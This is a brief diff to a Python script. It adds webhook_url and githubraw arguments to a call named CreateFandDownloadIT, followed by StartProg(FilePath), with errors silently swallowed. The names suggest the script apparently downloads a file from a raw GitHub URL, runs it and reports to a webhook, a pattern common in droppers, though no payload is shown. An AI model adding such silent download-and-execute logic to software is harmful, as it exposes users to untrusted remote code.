@@ -24,6 +24,5 @@ def StartProg(FilePath):
     except Exception as e:
         pass
 
-CreateFandDownloadIT()
+CreateFandDownloadIT(webhook_url, githubraw)
 StartProg(FilePath)
-
